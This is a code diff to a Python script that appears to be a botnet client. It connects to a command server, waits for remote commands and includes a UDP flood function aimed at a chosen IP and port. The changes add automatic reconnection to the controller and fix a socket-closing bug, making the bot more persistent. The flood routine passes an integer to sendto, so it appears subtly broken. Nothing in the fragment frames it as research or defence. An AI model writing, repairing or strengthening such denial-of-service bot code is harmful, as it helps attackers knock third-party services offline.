@@ -4,10 +4,13 @@ import socket, time, os, threading
 verbose = True
 
 
-addr = ('127.0.0.1', 5002)
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-stop = True
+
+stop = False
 def init():
+        global addr
+        global client
+        addr = ('127.0.0.1', 5002)
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while True:
                 try:
                         try:
@@ -18,7 +21,7 @@ def init():
                         client.send('client'.encode('utf-8'))
                         break
                 except:
-                        print(f'[ALERT] Connection with {addr[0]}:{addr[1]} closed')
+                        print('Trying to connect again')
                         
         main()
 
@@ -34,7 +37,7 @@ def udpflood(ip, port):
                 try:
                         sock.sendto(623,(ip,int(port)))
                 except:
-                        sock.close
+                        sock.close()
         
 
 
@@ -47,7 +50,14 @@ def main():
                 print(f'[CONNECTED] Connected to {addr[0]}:{addr[1]}')
         while True:
                 msg = None
-                msg = client.recv(1024)
+                try:
+                        msg = client.recv(1024)
+                except:
+                        client.close()
+                        print(f'[ALERT] Connection with {addr[0]}:{addr[1]} closed')
+                        init()
+                        break
+                        
                 decoded = msg.decode('utf-8')
                 if msg:
                     print('command recieved:', decoded)
